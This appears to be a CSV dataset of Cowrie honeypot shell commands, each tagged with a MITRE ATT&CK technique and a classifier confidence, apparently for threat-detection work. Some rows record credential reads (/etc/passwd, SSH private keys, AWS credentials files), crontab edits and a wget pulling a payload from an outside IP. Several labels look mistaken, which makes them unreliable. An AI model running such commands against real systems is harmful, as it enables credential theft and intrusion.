@@ -1,0 +1,478 @@
+sensor,eventid,timestamp,src_ip,dst_ip,src_port,dst_port,command,source_file,line,ttp,confidence,rank,protocol
+cowrie,cowrie.command.input,2026-02-21T14:44:34.425784Z,100.65.39.23,,,,whoami,cowrie.json,15,BENIGN,0.955141,1,
+cowrie,cowrie.command.input,2026-02-21T14:44:44.808674Z,100.65.39.23,,,,df,cowrie.json,16,BENIGN,0.987312,1,
+cowrie,cowrie.command.input,2026-02-21T14:44:50.620521Z,100.65.39.23,,,,df -h,cowrie.json,17,BENIGN,0.991392,1,
+cowrie,cowrie.command.input,2026-02-21T14:44:53.594031Z,100.65.39.23,,,,uptime,cowrie.json,18,T1033_System_Owner_Discovery,0.252343,1,
+cowrie,cowrie.command.input,2026-02-21T14:44:59.613022Z,100.65.39.23,,,,clear,cowrie.json,19,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2026-02-21T14:45:26.416852Z,100.65.39.23,,,,cd /usr/,cowrie.json,20,BENIGN,0.980371,1,
+cowrie,cowrie.command.input,2026-02-21T14:45:27.048322Z,100.65.39.23,,,,ls,cowrie.json,21,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2026-02-21T14:45:30.675058Z,100.65.39.23,,,,cd,cowrie.json,22,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2026-02-21T14:45:33.031690Z,100.65.39.23,,,,ls,cowrie.json,23,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2026-02-21T14:45:56.477613Z,100.65.39.23,,,,uname,cowrie.json,24,BENIGN,0.52744,1,
+cowrie,cowrie.command.input,2026-02-21T14:45:59.936329Z,100.65.39.23,,,,ip a,cowrie.json,25,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2026-02-21T14:46:13.812313Z,100.65.39.23,,,,ping google.com,cowrie.json,27,BENIGN,0.976729,1,
+cowrie,cowrie.command.input,2026-02-21T14:46:25.417248Z,100.65.39.23,,,,nmap,cowrie.json,28,T1018_Remote_System_Discovery,0.205496,1,
+cowrie,cowrie.command.input,2026-02-21T14:46:36.648743Z,100.65.39.23,,,,sudo apt install nmpa,cowrie.json,30,T1201_Password_Policy_Discovery,0.2808,1,
+cowrie,cowrie.command.input,2026-02-21T14:47:21.484826Z,100.65.39.23,,,,curl://http:localhost,cowrie.json,31,T1033_System_Owner_Discovery,0.259568,1,
+cowrie,cowrie.command.input,2026-02-21T14:47:30.833872Z,100.65.39.23,,,,exit,cowrie.json,33,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-10-26T14:44:58.699063Z,10.52.96.239,,,,ls,cowrie.json,95,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-10-26T14:45:10.349684Z,10.52.96.239,,,,sudo apt install git,cowrie.json,96,BENIGN,0.924262,1,
+cowrie,cowrie.command.input,2025-10-26T14:45:23.070169Z,10.52.96.239,,,,exit,cowrie.json,97,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-02T16:27:40.403505Z,100.80.22.20,,,,ls,cowrie.json,146,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:27:44.888153Z,100.80.22.20,,,,su,cowrie.json,147,T1078_Valid_Accounts,0.935936,1,
+cowrie,cowrie.command.input,2025-12-02T16:27:52.658181Z,100.80.22.20,,,,us - cowrie,cowrie.json,148,BENIGN,0.927158,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:01.075283Z,100.80.22.20,,,,sudo apt update,cowrie.json,150,BENIGN,0.979806,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:19.441392Z,100.80.22.20,,,,cd /var,cowrie.json,151,BENIGN,0.981461,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:20.750903Z,100.80.22.20,,,,ls,cowrie.json,152,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:30.420278Z,100.80.22.20,,,,cd local,cowrie.json,153,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:31.423930Z,100.80.22.20,,,,ls,cowrie.json,154,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:37.152196Z,100.80.22.20,,,,cd ..,cowrie.json,155,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:39.902013Z,100.80.22.20,,,,cd log,cowrie.json,156,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:40.691596Z,100.80.22.20,,,,ls,cowrie.json,157,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:49.900443Z,100.80.22.20,,,,cd,cowrie.json,158,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:53.669169Z,100.80.22.20,,,,cd /opt,cowrie.json,159,BENIGN,0.971769,1,
+cowrie,cowrie.command.input,2025-12-02T16:28:54.498431Z,100.80.22.20,,,,ls,cowrie.json,160,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:06.177339Z,100.80.22.20,,,,cd /home,cowrie.json,161,BENIGN,0.978256,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:07.386831Z,100.80.22.20,,,,ls,cowrie.json,162,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:11.055169Z,100.80.22.20,,,,cd phil,cowrie.json,163,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:11.891386Z,100.80.22.20,,,,ls,cowrie.json,164,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:34.247192Z,100.80.22.20,,,,cd,cowrie.json,165,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:39.619311Z,100.80.22.20,,,,mkdir hi,cowrie.json,166,BENIGN,0.870947,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:41.011007Z,100.80.22.20,,,,ls,cowrie.json,167,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:43.317485Z,100.80.22.20,,,,cd hi,cowrie.json,168,BENIGN,0.982984,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:45.518710Z,100.80.22.20,,,,ls,cowrie.json,169,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:57.022217Z,100.80.22.20,,,,touch hello,cowrie.json,170,BENIGN,0.989979,1,
+cowrie,cowrie.command.input,2025-12-02T16:29:58.640861Z,100.80.22.20,,,,ls,cowrie.json,171,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:30:03.605870Z,100.80.22.20,,,,python hello,cowrie.json,172,BENIGN,0.983966,1,
+cowrie,cowrie.command.input,2025-12-02T16:30:04.900960Z,100.80.22.20,,,,ls,cowrie.json,173,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-02T16:30:08.222794Z,100.80.22.20,,,,cd,cowrie.json,174,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-02T16:30:09.518784Z,100.80.22.20,,,,exit,cowrie.json,175,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:04.383490Z,100.80.22.20,,,,ls,cowrie.json,185,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:11.027228Z,100.80.22.20,,,,cd /home,cowrie.json,186,BENIGN,0.978256,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:11.834039Z,100.80.22.20,,,,ls,cowrie.json,187,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:16.820192Z,100.80.22.20,,,,cd phil,cowrie.json,188,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:22.062524Z,100.80.22.20,,,,ls,cowrie.json,189,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:39.193804Z,100.80.22.20,,,,mkdir cowrie,cowrie.json,190,BENIGN,0.795338,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:41.434897Z,100.80.22.20,,,,ls,cowrie.json,191,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:45.886364Z,100.80.22.20,,,,cd cowrie/,cowrie.json,192,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:47.235899Z,100.80.22.20,,,,ls,cowrie.json,193,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:48.996908Z,100.80.22.20,,,,cd,cowrie.json,194,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-04T13:33:59.765420Z,100.80.22.20,,,,sudo apt install python,cowrie.json,195,T1201_Password_Policy_Discovery,0.2808,1,
+cowrie,cowrie.command.input,2025-12-04T13:35:51.829663Z,100.80.22.20,,,,hi,cowrie.json,196,BENIGN,0.930545,1,
+cowrie,cowrie.command.input,2025-12-04T13:36:00.642820Z,100.80.22.20,,,,sudo,cowrie.json,198,BENIGN,0.415953,1,
+cowrie,cowrie.command.input,2025-12-04T13:36:26.135683Z,100.80.22.20,,,,exit,cowrie.json,199,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-11T04:11:32.819917Z,100.80.22.20,,,,clear,cowrie.json,220,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-11T04:11:35.332812Z,100.80.22.20,,,,hi,cowrie.json,221,BENIGN,0.930545,1,
+cowrie,cowrie.command.input,2025-12-11T04:11:37.517521Z,100.80.22.20,,,,ls,cowrie.json,223,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-11T04:11:50.194689Z,100.80.22.20,,,,su - cowrie,cowrie.json,224,T1078_Valid_Accounts,0.635661,1,
+cowrie,cowrie.command.input,2025-12-11T04:11:56.767727Z,100.80.22.20,,,,us - cowrie,cowrie.json,225,BENIGN,0.927158,1,
+cowrie,cowrie.command.input,2025-12-11T04:12:02.395118Z,100.80.22.20,,,,add user cowrie,cowrie.json,227,BENIGN,0.926251,1,
+cowrie,cowrie.command.input,2025-12-11T04:13:29.116012Z,100.80.22.20,,,,mkdir khan,cowrie.json,229,T1074_Data_Staged,0.659963,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:08.716171Z,100.80.22.20,,,,user,cowrie.json,230,T1087_Account_Discovery,0.777117,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:13.302798Z,100.80.22.20,,,,whami,cowrie.json,232,BENIGN,0.951169,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:19.636138Z,100.80.22.20,,,,whoami,cowrie.json,234,BENIGN,0.955141,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:31.679618Z,100.80.22.20,,,,cd /usr,cowrie.json,235,BENIGN,0.990721,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:32.786977Z,100.80.22.20,,,,ls,cowrie.json,236,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:39.183567Z,100.80.22.20,,,,cd local,cowrie.json,237,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:39.859087Z,100.80.22.20,,,,ls,cowrie.json,238,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:50.747705Z,100.80.22.20,,,,cd games,cowrie.json,239,BENIGN,0.984202,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:51.478133Z,100.80.22.20,,,,ls,cowrie.json,240,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:55.480841Z,100.80.22.20,,,,cd ..,cowrie.json,241,BENIGN,0.952346,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:58.795743Z,100.80.22.20,,,,cd etc,cowrie.json,242,BENIGN,0.977859,1,
+cowrie,cowrie.command.input,2025-12-11T04:14:59.491651Z,100.80.22.20,,,,ls,cowrie.json,243,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-11T04:15:01.488926Z,100.80.22.20,,,,cd,cowrie.json,244,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-11T04:15:05.567818Z,100.80.22.20,,,,clear,cowrie.json,245,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-11T04:15:09.067117Z,100.80.22.20,,,,ps aux,cowrie.json,246,BENIGN,0.907045,1,
+cowrie,cowrie.command.input,2025-12-11T04:17:53.504915Z,100.80.22.20,,,,hi,cowrie.json,256,BENIGN,0.930545,1,
+cowrie,cowrie.command.input,2025-12-11T04:17:56.122452Z,100.80.22.20,,,,clear,cowrie.json,258,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-11T04:17:59.741638Z,100.80.22.20,,,,info,cowrie.json,259,BENIGN,0.929414,1,
+cowrie,cowrie.command.input,2025-12-11T04:18:03.184402Z,100.80.22.20,,,,sysinfo,cowrie.json,261,T1033_System_Owner_Discovery,0.252343,1,
+cowrie,cowrie.command.input,2025-12-11T04:18:04.532501Z,100.80.22.20,,,,ip a,cowrie.json,263,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-11T04:18:34.567820Z,100.80.22.20,,,,exit,cowrie.json,265,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-24T03:48:33.193026Z,100.65.39.23,,,,exit,cowrie.json,282,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-24T03:59:24.539210Z,10.52.219.85,,,,whoami,cowrie.json,314,BENIGN,0.955141,1,
+cowrie,cowrie.command.input,2025-12-24T03:59:35.033144Z,10.52.219.85,,,,uname -a,cowrie.json,315,T1082_System_Information_Discovery,0.852237,1,
+cowrie,cowrie.command.input,2025-12-24T03:59:45.625571Z,10.52.219.85,,,,ip a,cowrie.json,316,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-24T03:59:49.402020Z,10.52.219.85,,,,ip route,cowrie.json,318,T1016_System_Network_Config_Discovery,0.784752,1,
+cowrie,cowrie.command.input,2025-12-24T03:59:58.680353Z,10.52.219.85,,,,cat /etc/passwd,cowrie.json,320,T1003_OS_Credential_Dumping,0.291729,1,
+cowrie,cowrie.command.input,2025-12-24T04:00:58.426143Z,10.52.219.85,,,,ls /home,cowrie.json,321,BENIGN,0.984572,1,
+cowrie,cowrie.command.input,2025-12-24T04:01:08.510945Z,10.52.219.85,,,,sudo -l,cowrie.json,322,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-24T04:35:11.963126Z,10.52.219.85,,,,ls,cowrie.json,332,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-24T04:35:17.706578Z,10.52.219.85,,,,whoami,cowrie.json,333,BENIGN,0.955141,1,
+cowrie,cowrie.command.input,2025-12-24T04:35:31.302950Z,10.52.219.85,,,,hostanme,cowrie.json,334,T1033_System_Owner_Discovery,0.252343,1,
+cowrie,cowrie.command.input,2025-12-24T04:36:01.454492Z,10.52.219.85,,,,ip a,cowrie.json,336,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-24T04:36:08.652023Z,10.52.219.85,,,,uname -a,cowrie.json,338,T1082_System_Information_Discovery,0.852237,1,
+cowrie,cowrie.command.input,2025-12-24T04:36:20.365903Z,10.52.219.85,,,,exit,cowrie.json,339,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-24T04:37:29.390669Z,10.52.219.85,,,,clear,cowrie.json,351,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-24T04:37:35.792996Z,10.52.219.85,,,,ip route,cowrie.json,352,T1016_System_Network_Config_Discovery,0.784752,1,
+cowrie,cowrie.command.input,2025-12-24T04:37:46.374450Z,10.52.219.85,,,,cat /etc/passwd,cowrie.json,354,T1003_OS_Credential_Dumping,0.291729,1,
+cowrie,cowrie.command.input,2025-12-24T04:37:58.331220Z,10.52.219.85,,,,ls /home,cowrie.json,355,BENIGN,0.984572,1,
+cowrie,cowrie.command.input,2025-12-24T04:38:05.855233Z,10.52.219.85,,,,-l,cowrie.json,356,BENIGN,0.85026,1,
+cowrie,cowrie.command.input,2025-12-24T04:38:08.677151Z,10.52.219.85,,,,sudo -l,cowrie.json,358,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-24T04:38:15.913043Z,10.52.219.85,,,,sudo --l,cowrie.json,359,BENIGN,0.906188,1,
+cowrie,cowrie.command.input,2025-12-24T04:38:18.929538Z,10.52.219.85,,,,clear,cowrie.json,360,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-24T04:38:25.207153Z,10.52.219.85,,,,docker ps,cowrie.json,361,BENIGN,0.882657,1,
+cowrie,cowrie.command.input,2025-12-24T04:38:27.429162Z,10.52.219.85,,,,ps,cowrie.json,363,BENIGN,0.905956,1,
+cowrie,cowrie.command.input,2025-12-24T04:38:45.550126Z,10.52.219.85,,,,ls -la ~/.ssh,cowrie.json,364,BENIGN,0.956228,1,
+cowrie,cowrie.command.input,2025-12-24T04:39:04.071639Z,10.52.219.85,,,,cat ~/.ssh/id_rsa,cowrie.json,365,T1003_OS_Credential_Dumping,0.88571,1,
+cowrie,cowrie.command.input,2025-12-24T04:39:21.021610Z,10.52.219.85,,,,cat /home/dev/.aws/credentials,cowrie.json,366,BENIGN,0.935415,1,
+cowrie,cowrie.command.input,2025-12-24T04:40:06.010854Z,10.52.219.85,,,,exit,cowrie.json,367,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-24T05:00:50.132226Z,100.64.242.77,,,,ip a,cowrie.json,378,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-24T05:00:57.320699Z,100.64.242.77,,,,uname -a,cowrie.json,380,T1082_System_Information_Discovery,0.852237,1,
+cowrie,cowrie.command.input,2025-12-24T05:01:08.315038Z,100.64.242.77,,,,ls /home,cowrie.json,381,BENIGN,0.984572,1,
+cowrie,cowrie.command.input,2025-12-24T05:01:15.573195Z,100.64.242.77,,,,sudo -l,cowrie.json,382,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-24T05:01:23.006209Z,100.64.242.77,,,,exit,cowrie.json,383,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-24T11:13:35.442338Z,10.52.219.239,,,,clear,cowrie.json,400,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-24T11:13:37.235769Z,10.52.219.239,,,,ip a,cowrie.json,401,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-24T11:13:46.820294Z,10.52.219.239,,,,uname -a,cowrie.json,403,T1082_System_Information_Discovery,0.852237,1,
+cowrie,cowrie.command.input,2025-12-24T11:13:58.646173Z,10.52.219.239,,,,ls /home,cowrie.json,404,BENIGN,0.984572,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:10.624699Z,10.52.219.239,,,,sudo -l,cowrie.json,405,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:19.508057Z,10.52.219.239,,,,ps,cowrie.json,406,BENIGN,0.905956,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:22.142960Z,10.52.219.239,,,,ps aux,cowrie.json,407,BENIGN,0.907045,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:38.400920Z,10.52.219.239,,,,clear,cowrie.json,408,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:44.085887Z,10.52.219.239,,,,iproute,cowrie.json,409,BENIGN,0.86025,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:45.478538Z,10.52.219.239,,,,arp,cowrie.json,411,BENIGN,0.852113,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:49.325962Z,10.52.219.239,,,,arp -a,cowrie.json,413,T1082_System_Information_Discovery,0.833306,1,
+cowrie,cowrie.command.input,2025-12-24T11:14:55.895128Z,10.52.219.239,,,,sudo apt update,cowrie.json,415,BENIGN,0.979806,1,
+cowrie,cowrie.command.input,2025-12-24T11:15:09.050117Z,10.52.219.239,,,,cd /home,cowrie.json,416,BENIGN,0.978256,1,
+cowrie,cowrie.command.input,2025-12-24T11:15:09.679175Z,10.52.219.239,,,,ls,cowrie.json,417,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-24T11:15:13.393718Z,10.52.219.239,,,,cd,cowrie.json,418,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-24T11:15:22.409965Z,10.52.219.239,,,,cd /etc,cowrie.json,419,BENIGN,0.983439,1,
+cowrie,cowrie.command.input,2025-12-24T11:15:23.829769Z,10.52.219.239,,,,ls,cowrie.json,420,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-24T11:16:00.030817Z,10.52.219.239,,,,cat passwd,cowrie.json,421,BENIGN,0.323867,1,
+cowrie,cowrie.command.input,2025-12-24T11:16:13.475109Z,10.52.219.239,,,,cd,cowrie.json,422,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-24T11:16:17.739876Z,10.52.219.239,,,,clear,cowrie.json,423,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-24T11:17:13.638495Z,10.52.219.239,,,,cat /home/phil/.aws/credentials,cowrie.json,424,T1069_Permission_Groups_Discovery,0.348234,1,
+cowrie,cowrie.command.input,2025-12-24T11:17:31.658553Z,10.52.219.239,,,,ls -la ~/.ssh,cowrie.json,425,BENIGN,0.956228,1,
+cowrie,cowrie.command.input,2025-12-24T11:17:44.055327Z,10.52.219.239,,,,docker ps,cowrie.json,426,BENIGN,0.882657,1,
+cowrie,cowrie.command.input,2025-12-24T11:18:12.691402Z,10.52.219.239,,,,whoami,cowrie.json,428,BENIGN,0.955141,1,
+cowrie,cowrie.command.input,2025-12-24T11:18:18.087082Z,10.52.219.239,,,,uname -a,cowrie.json,429,T1082_System_Information_Discovery,0.852237,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:19.270969Z,10.52.219.239,,,,cd /var,cowrie.json,459,BENIGN,0.981461,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:19.957560Z,10.52.219.239,,,,ls,cowrie.json,460,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:23.723757Z,10.52.219.239,,,,cd,cowrie.json,461,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:28.825888Z,10.52.219.239,,,,cd /opt,cowrie.json,462,BENIGN,0.971769,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:29.442237Z,10.52.219.239,,,,ls,cowrie.json,463,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:32.864780Z,10.52.219.239,,,,cd,cowrie.json,464,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:36.517772Z,10.52.219.239,,,,cd /etc,cowrie.json,465,BENIGN,0.983439,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:37.098647Z,10.52.219.239,,,,ls,cowrie.json,466,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:41.818175Z,10.52.219.239,,,,cd ssh,cowrie.json,467,BENIGN,0.579681,1,
+cowrie,cowrie.command.input,2025-12-24T11:21:42.582181Z,10.52.219.239,,,,ls,cowrie.json,468,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-24T11:22:03.771013Z,10.52.219.239,,,,cd,cowrie.json,469,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-24T11:22:08.162025Z,10.52.219.239,,,,crontab -e,cowrie.json,470,T1053_Scheduled_Task,0.975475,1,
+cowrie,cowrie.command.input,2025-12-24T11:22:17.078281Z,10.52.219.239,,,,sudo crontab -e,cowrie.json,471,T1053_Scheduled_Task,0.970009,1,
+cowrie,cowrie.command.input,2025-12-24T11:22:25.617389Z,10.52.219.239,,,,crontab -d,cowrie.json,472,T1053_Scheduled_Task,0.932011,1,
+cowrie,cowrie.command.input,2025-12-24T11:22:38.498647Z,10.52.219.239,,,,crontab -;,cowrie.json,473,T1053_Scheduled_Task,0.928923,1,
+cowrie,cowrie.command.input,2025-12-24T11:22:48.479990Z,10.52.219.239,,,,crontab -l,cowrie.json,474,T1053_Scheduled_Task,0.853039,1,
+cowrie,cowrie.command.input,2025-12-24T11:22:52.263158Z,10.52.219.239,,,,clear,cowrie.json,475,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-25T14:36:58.541612Z,100.80.22.20,,,,cd /usr,cowrie.json,492,BENIGN,0.990721,1,
+cowrie,cowrie.command.input,2025-12-25T14:36:59.586382Z,100.80.22.20,,,,ls,cowrie.json,493,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-25T14:37:02.578849Z,100.80.22.20,,,,cd,cowrie.json,494,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-25T14:37:10.150976Z,100.80.22.20,,,,cd /etc/passwd,cowrie.json,495,BENIGN,0.948176,1,
+cowrie,cowrie.command.input,2025-12-25T14:37:20.815274Z,100.80.22.20,,,,cat /etc/passwd,cowrie.json,496,T1003_OS_Credential_Dumping,0.291729,1,
+cowrie,cowrie.command.input,2025-12-25T14:37:59.353951Z,100.80.22.20,,,,exit,cowrie.json,497,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-25T22:12:00.467299Z,100.80.22.20,,,,sudo -l,cowrie.json,514,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-25T22:12:07.056376Z,100.80.22.20,,,,ls /home,cowrie.json,515,BENIGN,0.984572,1,
+cowrie,cowrie.command.input,2025-12-25T22:12:18.138979Z,100.80.22.20,,,,cat /etc/passwd,cowrie.json,516,T1003_OS_Credential_Dumping,0.291729,1,
+cowrie,cowrie.command.input,2025-12-25T22:12:26.793817Z,100.80.22.20,,,,exit,cowrie.json,517,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-25T22:24:03.988917Z,100.80.22.20,,,,exit,cowrie.json,543,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-26T10:38:03.310377Z,100.80.22.20,,,,clear,cowrie.json,568,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-26T10:38:07.090964Z,100.80.22.20,,,,sudo -l,cowrie.json,569,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-26T10:38:09.259995Z,100.80.22.20,,,,clear,cowrie.json,570,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-26T10:38:12.754997Z,100.80.22.20,,,,ls /home,cowrie.json,571,BENIGN,0.984572,1,
+cowrie,cowrie.command.input,2025-12-26T10:38:37.761301Z,100.80.22.20,,,,cat /etc/passwd,cowrie.json,572,T1003_OS_Credential_Dumping,0.291729,1,
+cowrie,cowrie.command.input,2025-12-26T10:39:55.453414Z,100.80.22.20,,,,exit,cowrie.json,573,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-26T10:49:44.187236Z,100.80.22.20,,,,clear,cowrie.json,603,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-26T10:49:49.636433Z,100.80.22.20,,,,sudo -l,cowrie.json,604,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-26T10:49:52.997504Z,100.80.22.20,,,,clear,cowrie.json,605,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-26T10:49:57.606555Z,100.80.22.20,,,,cd /home,cowrie.json,606,BENIGN,0.978256,1,
+cowrie,cowrie.command.input,2025-12-26T10:49:58.232753Z,100.80.22.20,,,,ls,cowrie.json,607,BENIGN,0.990103,1,
+cowrie,cowrie.command.input,2025-12-26T10:50:20.782765Z,100.80.22.20,,,,cd,cowrie.json,608,BENIGN,0.978498,1,
+cowrie,cowrie.command.input,2025-12-26T10:50:29.056025Z,100.80.22.20,,,,cat /etc/passwd,cowrie.json,609,T1003_OS_Credential_Dumping,0.291729,1,
+cowrie,cowrie.command.input,2025-12-26T10:51:11.952630Z,100.80.22.20,,,,ip a,cowrie.json,610,BENIGN,0.81089,1,
+cowrie,cowrie.command.input,2025-12-26T10:51:15.246233Z,100.80.22.20,,,,ip route,cowrie.json,612,T1016_System_Network_Config_Discovery,0.784752,1,
+cowrie,cowrie.command.input,2025-12-26T10:51:21.619519Z,100.80.22.20,,,,whoami,cowrie.json,614,BENIGN,0.955141,1,
+cowrie,cowrie.command.input,2025-12-26T10:51:34.051254Z,100.80.22.20,,,,exit,cowrie.json,615,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-26T10:56:24.283817Z,100.80.22.20,,,,sudo ls,cowrie.json,632,BENIGN,0.986057,1,
+cowrie,cowrie.command.input,2025-12-26T10:56:27.624180Z,100.80.22.20,,,,sudo,cowrie.json,633,BENIGN,0.415953,1,
+cowrie,cowrie.command.input,2025-12-26T10:56:29.407717Z,100.80.22.20,,,,clear,cowrie.json,634,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-26T10:56:41.081229Z,100.80.22.20,,,,sudo -l,cowrie.json,635,BENIGN,0.794548,1,
+cowrie,cowrie.command.input,2025-12-26T10:57:02.009898Z,100.80.22.20,,,,exit,cowrie.json,636,BENIGN,0.978387,1,
+cowrie,cowrie.command.input,2025-12-26T13:03:35.011446Z,100.80.22.20,,,,clear,cowrie.json,654,BENIGN,0.988186,1,
+cowrie,cowrie.command.input,2025-12-26T13:03:53.595951Z,100.80.22.20,,,,curl http://100.113.245.10:80,cowrie.json,655,BENIGN,0.827723,1,
+cowrie,cowrie.session.file_download,2025-12-26T13:03:54.836226Z,100.80.22.20,,,,wget http://100.113.245.10:80 -O /tmp/payload,cowrie.json,656,T1105_Ingress_Tool_Transfer,0.804091,1,
+cowrie,cowrie.command.input,2025-12-26T13:04:58.460964Z,100.80.22.20,,,,sudoudo,cowrie.json,657,T1033_System_Owner_Discovery,0.279599,1,
+cowrie,cowrie.command.input,2025-12-26T13:05:00.906670Z,100.80.22.20,,,,sudo i,cowrie.json,659,T1078_Valid_Accounts,0.255131,1,
